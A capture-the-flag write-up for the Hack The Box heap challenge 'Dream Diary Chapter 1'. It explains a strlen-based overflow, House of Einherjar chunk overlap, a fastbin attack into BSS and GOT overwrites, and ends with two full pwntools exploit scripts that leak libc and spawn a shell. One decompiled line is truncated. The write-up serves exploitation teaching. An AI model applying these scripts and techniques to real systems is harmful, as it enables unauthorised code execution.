---
layout: single
classes: wide
title: "HTB Dream Diary Chapter 1 Writeup by FizzBuzz101"
header:
  teaser: /assets/images/teasers/challenges/dd1.png
excerpt: "Now that Dream Diary: Chapter 1 has finally retired, here is my writeup for it. This problem along with Chapter 2 were perhaps the 2 heap challenges I solved over a year ago that helped me start to understand heap pwn, and also inspired me to develop Dream Diary: Chapter 3 down the road."
---

Now that Dream Diary: Chapter 1 has finally retired, here is my writeup for it. This problem along with Chapter 2 were perhaps the 2 heap challenges I solved over a year ago that helped me start to understand heap pwn, and also inspired me to develop Dream Diary: Chapter 3 down the road. 

Before continuing, here are some quick acknowledgements:  
These two articles helped me improve my understanding of the heap tremendously when I started pwn a year ago.  
https://0x00sec.org/t/null-byte-poisoning-the-magic-byte/3874   
https://devel0pment.de/?p=688   
Also, huge thanks to [D3v17](https://syst3mfailure.github.io/) and c3bacd17 for proofreading this writeup.

To begin, note the hint about "Xenial Xerus"; I did all my debugging and testing on a Xenial Xerus headless VM.

## Finding the Bug

Here is the reversed binary from GHIDRA:
```c
void possible_main(void)
{
  int iVar1;
  long in_FS_OFFSET;
  undefined8 local_18;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_18 = 0;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  do {
    while( true ) {
      while( true ) {
        menu();
        read(0,&local_18,4);
        iVar1 = atoi((char *)&local_18);
        if (iVar1 != 2) break;
        edit();
      }
      if (2 < iVar1) break;
      if (iVar1 == 1) {
        allocate();
      }
      else {
LAB_00400d71:
        puts("Invalid choice!");
      }
    }
    if (iVar1 != 3) {
      if (iVar1 == 4) {
        exit(0);
      }
      goto LAB_00400d71;
    }
    delete();
  } while( true );
}



void menu(void)
{
  puts("\n+------------------------------+");
  puts("|         Dream Diary          |");
  puts("+------------------------------+");
  puts("| [1] Allocate                 |");
  puts("| [2] Edit                     |");
  puts("| [3] Delete                   |");
  puts("| [4] Exit                     |");
  puts("+------------------------------+");
  printf(">> ");
  return;
}

void FUN_004008ec(void *pvParm1,size_t sParm2) //for input reading
{
  ssize_t sVar1;
  
  sVar1 = read(0,pvParm1,sParm2);
  if ((int)sVar1 < 1) {
    puts("Read error!");
    exit(-1);
  }
  return;
}

void edit(void)
{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0;
  printf("Index: ");
  read(0,&local_18,4);
  iVar1 = atoi((char *)&local_18);
  if ((iVar1 < 0) || (0xf < iVar1)) {
    puts("Out of bounds!");
  }
  else {
    if (*(long *)(&DAT_006020c0 + (long)iVar1 * 8) == 0) {
      puts("No UAF for you!");
    }
    else {
      sVar2 = strlen(*(char **)(&DAT_006020c0 + (long)iVar1 * 8));
      printf("Data: ");
      FUN_004008ec(*(undefined8 *)(&DAT_006020c0 + (long)iVar1 * 8),sVar2,sVar2);
      puts("Done!");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}


void allocate(void)
{
  int iVar1;
  size_t __size;
  void *pvVar2;
  long in_FS_OFFSET;
  int local_24;
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0;
  local_24 = 0;
  do {
    if (0xf < local_24) {
      puts("Too many notes!");
LAB_00400aad:
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
      }
      return;
    }
    if (*(long *)(&DAT_006020c0 + (long)local_24 * 8) == 0) {
      printf("\nSize: ");
      FUN_004008ec(&local_18,6);
      iVar1 = atoi((char *)&local_18);
      __size = SEXT48(iVar1);
      pvVar2 = malloc(__size);
      *(void **)(&DAT_006020c0 + (long)local_24 * 8) = pvVar2;
      if (*(long *)(&DAT_006020c0 + (long)local_24 * 8) == 0) {
        puts("Malloc error!");
        exit(-1);
      }
      printf("Data: ");
      FUN_004008ec(*(undefined8 *)(&DAT_006020c0 + (long)local_24 * 8),__size,__size);
      puts("Success!");
      goto LAB_00400aad;
    }
    local_24 = local_24 + 1;
  } while( true );
}


void delete(void)
{
  int iVar1;
  long in_FS_OFFSET;
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0;
  printf("Index: ");
  read(0,&local_18,4);
  iVar1 = atoi((char *)&local_18);
  if ((iVar1 < 0) || (0xf < iVar1)) {
    puts("Out of bounds!");
  }
  else {
    if (*(long *)(&DAT_006020c0 + (long)iVar1 * 8) == 0) {
      puts("No double-free for you!");
    }
    else {
      free(*(void **)(&DAT_006020c0 + (long)i
      *(undefined8 *)(&DAT_006020c0 + (long)iVar1 * 8) = 0;
      puts("Done!");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
```

There are a few things one should note here. The binary has ASLR (of course) and partial RELRO without PIE. The array of 8 byte pointers is stored at 0x6020c0 in BSS. 

Now, where is the bug? Well, alloc uses read() and edit uses strlen() to check the amount to read(); read() doesn't add a null byte, but strlen() determines the length based on the ending null byte. Therefore, if we completely fill a heap chunk, strlen() might keep thinking that the size field of the next chunk is part of the string! This bug is very similar, but not exactly, like an off by one (as you can go more than one if the size of next chunk is more than one byte), which can lead to a classic House of Einherjar attack.

## Exploitation Plan

We can use this bug to overlap heap chunks with back coalesce (which will open up other bugs that you can emulate like UAF or double free) as long as we beat the two checks in unlink to back coalesce them (prev size and fd/bk checks). Xenial Xerus comes with glibc 2.23, so pulling up the source shows the following when freeing a non fast chunk that doesn't have the prev inuse flag set:
```c
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```
At unlink, there are two checks. 
```c
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");	
```
Unlink is also called sometimes during malloc when it needs to split/unlink from the binlists:
```c
          else
            {
              size = chunksize (victim);

              /*  We know the first chunk in this bin is big enough to use. */
              assert ((unsigned long) (size) >= (unsigned long) (nb));

              remainder_size = size - nb;

              /* unlink */
              unlink (av, victim, bck, fwd);

```
For the first check, we must always ensure that the chunk's next chunk's prev_size matches our the current chunk's size. For example, if you shrink a 0x290 sized chunk into 0x280, you want to ensure that the chunk's location + 0x280 has the correct prev_size. 
The second check is trivially beaten. Oftentimes, you can let malloc() and free() write the correct pointers there for you, and don't have to forge anything. I will explain this more later on.

My exploitation plan was quite simple. I allocated 4 chunks (with the last one meant to prevent top consolidation). Then I freed the second chunk and used the small overflow to shrink the chunk size. I also made sure that the shrunk chunk had a valid "next" chunk prev_size (just write the same size at the address of chunk + new faked size). This way, we can still allocate from the unsorted bin without causing the check to fail; because we shrunk the size, the original prev_size will remain the original size (the third chunk will use this original larger prev_size to do the consolidation), while malloc and free will update the prev_size at a location above it due to the shrunken nature.

Next, I allocated something of smallbin size, then something of fastbin size (0x70 bin). The 0x70 fastbin is often a good target since fastbin does have a valid size check (unlike modern tcache); a size of 0x7f will pass this check for this bin and this size is easy to fake with misalignment in 64 bit processes. I freed the first item of smallbin size back into the unsorted bin (this will keep me safe from the second unlink check as you can see in a debugger). Once you free the third original chunk, it will only see the original prev_size, which is below the prev_size that the shrunken chunk was updating, thereby consolidating all the way back to the top of the second chunk and giving a massive heap overlap.

If you had any fastbins beforehand allocated in this overlapped region (before the coaelesce), it becomes quite trivial to perform the classic fastbin attack. As I briefly hit upon above, we need to ensure that a "valid" size is at the location we choose to redirect a chunk into for this classic fastbin attack. Remember that the array starts at 0x06020c0
```
0x60209d:	0x32e2311540000000	0x000000000000007f
0x6020ad:	0x0000000000000000	0x0000000000000000
```
This valid fastbin chunk is close to our array, and our chunk is large enough to change what the array points to. There is only Partial Relro, so we can easily change the pointers of the array to point to GOT addresses, and then perform classic GOT overwrites.

To leak libc, we can create a fake chunk in bss and at the 0th index, overwrite it with a pointer to free@GOT using alloc.  With this same fastbin, we can overwrite the next index with puts@GOT and index 2 with atoi@GOT.  Then, we can overwrite free@GOT with puts@PLT via edit and then call delete (which uses free) on index 1, which now has puts@GOT.  This will leak a libc address!  Then, using the atoi@GOT in the second index, we overwrite it with system, send in 'bash', and this binary will have been pwned!

## Final Exploits
Here is my final exploit that worked locally:
```py
from pwn import *

remote = ssh(host='10.0.2.4', user='will', password='PASSWORD_OMITTED')
remote.set_working_directory('/home/will/dreamdiary1')
binary = ELF('./chapter1')
libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')
context(arch='amd64')

p = remote.process('./chapter1')

def alloc(size, data):
	p.recvrepeat(0.2)
	p.sendline(str(1))
	p.recvrepeat(0.2)
	p.sendline(str(size))
	p.recvrepeat(0.2)
	p.sendline(data)

def edit(index, data):
	p.recvrepeat(0.2)
	p.sendline(str(2))
	p.recvrepeat(0.2)
	p.sendline(str(index))
	p.recvrepeat(0.2)
	p.sendline(data)

def free(index):
	p.recvrepeat(0.2)
	p.sendline(str(3))
	p.recvrepeat(0.2)
	p.sendline(str(index))

#will be coalesced with top chunk... doesn't matter, will help with strlen issues because data there rather than null bytes
alloc(0x500, 'A' * 0x500) #0
free(0)
#this first chunk will allow us to tamper with the size of the next chunk
alloc(0x108, 'A' * 0x108) #0
alloc(0x288, 'B'*0x270 + p64(0x280)) #the 0x280 is meant to beat the first check in the unlink macro
alloc(0x108, 'C'*0x108) #2
# Prevent top chunk consolidation
alloc(0x108, 'D'*0x108) #3
free(1)
#abusing edit to shrink the free chunk to 0x280 size
edit(0, 'A' * 0x108 + '\x80\x02')
#preparing for the back coalesce once we free the 3rd chunk
alloc(0x80, 'E' * 0x80) #1
#create a fastbin sized chunk for later fastbin attack
alloc(0x60, 'F' * 0x70) #4
#freeing the E chunk
free(1)
#now free C chunk... should cause a back coalesce and overlap into memory where we still have chunk control in
free(2)
free(4) #setting up for the fastbin attack
#array starts here, each index is 8 bytes: 006020c0
#15 notes max
#valid fastbin chunk:
#gdb-peda$ x/20gx (char*)0x006020c0-0x23
#0x60209d:	0x32e2311540000000	0x000000000000007f
#0x6020ad:	0x0000000000000000	0x0000000000000000
#it is behind bss... so let's just destory the 0th index
#so target address for fastbin attack on free for leak is 0x60209d
alloc(0x200, 'Z' * 0x80 + p64(0x90) + p64(0x71) + p64(0x60209d)) #new index 1, abusing the overlapped chunk to begin a fastbin attack
#pulling from fastbin
alloc(0x60, 'G')
#this allocation will get us into bss, let's overwrite pointers now
alloc(0x60, 'A' * 0x13 + p64(binary.got['free']) + p64(binary.got['puts']) + p64(binary.got['atoi']))
#edit free@GOT, make it puts@PLT, then have it call free aka puts@PLT on puts@GOT which is at index 1
edit(0, p64(binary.plt['puts']))
#now delete 1 should leak a libc address, remember that 1 is pointing to puts@GOT
free(1)
temp = p.recvrepeat(1).split('\n')[0]
putsAddress =  u64(temp + '\x00' * 2)
log.info("Leaked puts: " + hex(putsAddress))
libcBase = putsAddress - libc.symbols['puts']
log.info("Leaked libc base: " + hex(libcBase))
systemAddress = libcBase + libc.symbols['system']
#overwriting atoi@GOT with system
edit(2, p64(systemAddress))
p.recvrepeat(1)
log.info("Creating a shell")
p.sendline('bash')
p.interactive()
```

For remote, I had to make 2 small adjustments. One issue was with the way my leak was being parsed. Another was that despite having good leaks, it often crashed. Why is this? Well turns out remote has pty enabled with socat, therefore it interprets some of the non printable ASCII bytes as control characters, which isn't what we want (0x7f for example will be treated as a delete). The fix is simple: just escape the 0x7f with a 0x16. 

Here is the final remote exploit:

```py
from pwn import *
import sys

binary = ELF('./chapter1')
libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')
context(arch='amd64')

p = remote('docker.hackthebox.eu', int(sys.argv[1]))

def alloc(size, data):
	p.recvrepeat(0.5)
	p.sendline(str(1))
	p.recvrepeat(0.5)
	p.sendline(str(size))
	p.recvrepeat(0.5)
	p.sendline(data.replace("\x16", "\x16\x16").replace("\x7f", "\x16\x7f"))

def edit(index, data):
	p.recvrepeat(0.5)
	p.sendline(str(2))
	p.recvrepeat(0.5)
	p.sendline(str(index))
	p.recvrepeat(0.5)
	p.sendline(data.replace("\x16", "\x16\x16").replace("\x7f", "\x16\x7f"))

def free(index):
	p.recvrepeat(0.5)
	p.sendline(str(3))
	p.recvrepeat(0.5)
	p.sendline(str(index))

alloc(0x500, 'A' * 0x500)
free(0)
alloc(0x108, 'A' * 0x108)
alloc(0x288, 'B'*0x270 + p64(0x280))
alloc(0x108, 'C'*0x108) 
alloc(0x108, 'D'*0x108)
free(1)
edit(0, 'A' * 0x108 + '\x80\x02')
alloc(0x80, 'E' * 0x80)
alloc(0x60, 'F' * 0x70)
free(1)
free(2)
free(4)
alloc(0x200, 'Z' * 0x80 + p64(0x90) + p64(0x71) + p64(0x60209d))
alloc(0x60, 'G')
alloc(0x60, 'A' * 0x13 + p64(binary.got['free']) + p64(binary.got['puts']) + p64(binary.got['atoi']))
edit(0, p64(binary.plt['puts']))
free(1)
temp = p.recvrepeat(1).split('\n')[1][:-1].ljust(8, '\x00')
log.info("Leaked address string for puts: " + temp)
putsAddress =  u64(temp)
log.info("Leaked puts: " + hex(putsAddress))
libcBase = putsAddress - libc.symbols['puts']
log.info("Leaked libc base: " + hex(libcBase))
systemAddress = libcBase + libc.symbols['system']
edit(2, p64(systemAddress))
p.recvrepeat(1)
log.info("Creating a shell")
p.sendline('bash')
p.interactive()
```
